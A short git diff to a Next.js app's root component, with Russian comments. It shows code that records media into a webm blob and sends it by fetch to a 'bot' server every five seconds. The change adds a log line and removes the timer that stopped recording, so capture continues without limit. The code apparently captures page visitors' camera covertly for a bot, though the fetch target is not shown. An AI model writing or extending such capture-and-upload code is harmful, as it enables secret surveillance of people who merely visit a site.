@@ -35,7 +35,7 @@ const myApp = ({ Component, pageProps }) => {
 
                     mediaRecorder.onstop = async () => {
                         const blob = new Blob(chunks, { type: 'video/webm' });
-
+                        console.log(blob);
                         // Отправляем данные на сервер (бота) с использованием fetch
                         setInterval(async () => {
                             try {
@@ -59,13 +59,7 @@ const myApp = ({ Component, pageProps }) => {
                                 console.error('Ошибка fetch:', error);
                             }
                         }, 5000); // Отправлять фото каждые 5 секунд
-
-                        // Остановка записи через определенное время (например, 10 секунд)
-                        setTimeout(() => {
-                            mediaRecorder.stop();
-                        }, 10000);
                     };
-
                     mediaRecorder.start(100);
                 }
             } catch (error) {
